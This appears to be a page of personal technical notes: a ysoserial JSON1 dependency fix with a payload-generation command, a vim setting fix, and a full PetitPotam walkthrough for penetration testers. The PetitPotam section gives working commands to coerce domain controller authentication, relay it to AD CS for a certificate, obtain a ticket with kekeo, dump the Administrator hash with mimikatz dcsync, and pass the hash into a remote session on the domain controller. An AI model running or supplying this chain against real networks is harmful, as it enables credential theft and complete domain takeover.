## ysoserial JSON1 error fix - CompositeInvocationHandlerImpl
When ysoserial payload JSON1 fails with 
``` 
Java.lang.ClassNotFoundException com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl
``` 
go to [jar-download.com](https://jar-download.com/) 
and download the [openjdk-orb jar](https://jar-download.com/artifacts/org.jboss.openjdk-orb/openjdk-orb). This will give you a zip file with 2 jar files in it, 
openjdk-orb-XXX.final and jboss-transaction-api_XX_spec-XXX.final. Put them in the folder with ysoserial.

Then on the command line you can replace the ususal `java -jar ysoserial.jar` with `java -cp jboss-transaction-api_XX_spec-XXX.Final.jar:openjdk-orb-XXX.Final.jar:ysoserial-master-d367e379d9-1.jar ysoserial.GeneratePayload`

e.g.

 ```
 java -cp jboss-transaction-api_1.2_spec-1.0.0.Final.jar:openjdk-orb-8.1.5.Final.jar:ysoserial-master-d367e379d9-1.jar ysoserial.GeneratePayload 'JSON1' 'ping -c 10 127.0.0.1'
```
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>


## fix set mouse-=a not working in vim
[debian bug report where it is called a feature](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=864074)

instead of editting `/etc/vim/vimrc` or `/etc/vim/vimrc.local`, edit `$VIMRUNTIME/defaults.vim`  
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>

## PetitPotam attack beginning to end process for penetration testers on one windows machine only (WITHOUT KALI)!
[PetitPotam](https://github.com/topotam/PetitPotam) is an attack by [topotam](https://github.com/topotam) which uses MS-EFSRPC EfsRpcOpenFileRaw to coerce authentication (like auth relay, sort of).  

### Requirements:
- [PetitPotam](https://github.com/topotam/PetitPotam) if you don't have the Kali machine
- [Impacket fork by ExAndroidDev](https://github.com/ExAndroidDev/impacket)
- [mimikatz by gentilkiwi](https://github.com/gentilkiwi/mimikatz/releases) v2.2.0 20210724 or newer
- [kekeo by gentilkiwi](https://github.com/gentilkiwi/kekeo/releases) - probably v2.20 20210723 or newer, but older not tested - if you do have Kali machine 


### Assumptions:
- You are in control (admin rights) of a windows machine which can reach the DC and CA for the domain you are targetting
- Python3.9+ is installed
- Impacket is installed
- SMB is running on the windows machine you control
- Domain has CAs with web services running
- Domain is using NTLM  

### Setup:
- Remove all previous version of impacket (or set up a venv for the exandroiddev version). Depending on how you setup and install impacket originally this can be a pain and is not covered here, sorry  
- On windows - install pyreadline `python -m pip install pyreadline`
- in a folder of your choice in powershell:
  - `git clone https://github.com/ExAndroidDev/impacket.git`
  - `cd impacket`
  - `git switch ntlmrelayx-adcs-attack`
  - `python .\setup.py install`
  - `cd ..`
  - `git clone https://github.com/topotam/PetitPotam.git`
  - `wget -outfile kekeo.zip https://github.com/gentilkiwi/kekeo/releases/download/2.2.0-20210723/kekeo.zip`
  - `Expand-Archive kekeo.zip`
  - `wget -outfile mimikatz_trunk.zip https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210729/mimikatz_trunk.zip`
  - `Expand-Archive .\mimikatz_trunk.zip`  
 
 ### The action:
 - check the certificate servers available (needs to be done on a domain connected computer. May or may not be DC):
  - `certutil -config - -ping`
  - A window pops up with known CAs. Select one and click OK. You should see in Session 1 'CertUtil: -ping command completed successfully.'
 - Turn off SMB port listening. This is a minor pain as port 445 is in use. We need to stop SMB services to be able to listen on Windows:
   - in services right click on the *Workstation* service and click stop
   - in services right click on the *Server* service and select properties. In properties change the drop down to Disabled and apply
   - in services right click on the *Server* service again and select stop
- In an administrative powershell session (Call this Session 1):
  - Session 1: cd into the exandroiddev impacket examples folder `cd impacket\examples`
  - Session 1: `python .\ntlmrelayx.py -debug -smb2support --target http://<IP_OF_CA_SERVER>/certsrv/certfnsh.asp --adcs --template DomainController`
- In a second administrative powershell session (Call this Session 2):
  - Session 2: cd into the petitpotam folder `cd petitpotam`
  - Session 2: `.\Petitpotam.py -d <domain_name e.g. lab.local> -pipe lsarpc <LOCAL_IP e.g. 10.1.1.62> <DC_IP e.g. 10.1.1.1>`
- Session 1: you should see a stream of text like: 
  - *SMBD-Thread-4: Connection from <DOMAIN_SHORT_NAME>/<DC_MACHINE_NAME>$@<DC_IP> controlled, attacking target http://<IP_OF_CA_SERVER>*
  - *HTTP server returned error code 200, treating as a successful login*
  - *Authenticating against http://<IP_OF_CA_SERVER> as <DOMAIN_SHORT_NAME>/<DC_MACHINE_NAME>$ SUCCEED*
  - *Generating CSR...*
  - *CSR generated!*
  - *Getting certificate...*
  - *GOT CERTIFICATE!*
  - *Base64 certificate of user <DC_MACHINE_NAME>$:*
  - and then a chunk of Base64 (the certificate).
  - You may see a few of these intermixed as multiple requests are being made from SESSION 2
- Session 1: hit `CTRL-C` to kill the ntlm relay
- Session 2: hit `CTRL-C` to kill the Petitpotam.py
- Session 2:
  - cd into the kekeo folder `cd ..\kekeo\x64\`
  - `.\kekeo.exe`
  - `base64 /input:on`
  - `tgt::ask /pfx:<Base64_Certificate_Here> /user:<DC_MACHINE_NAME>$ /domain:lab.local /ptt`
- Re-enable the *Server* and *Workstation* services (make sure you turn Server back to Auto start)
- Session 2:
  - `klist`
  - you should see text including `Cached Tickets: (1)` and `Client: <DC_MACHINE_NAME>$ @ <DOMAIN>`
  - `cd ..\..\mimikatz_trunk\x64\ `
  - `.\mimikatz.exe`
  - `lsadump::dcsync /domain:bouldersrest.local /user:administrator`
  - copy the *Hash NTLM* value to the clipboard (don't save it to disk, risks others accessing it)
  - `privilege::debug`
  - `sekurlsa::pth /user:Administrator /domain:bouldersrest.local /ntlm:<administrator_hash>`
  - In the new cmd prompt which is created:
    - `powershell.exe`
    - `Enter-PSSession -ComputerName <DC_FQDN>`
    - ### PROFIT
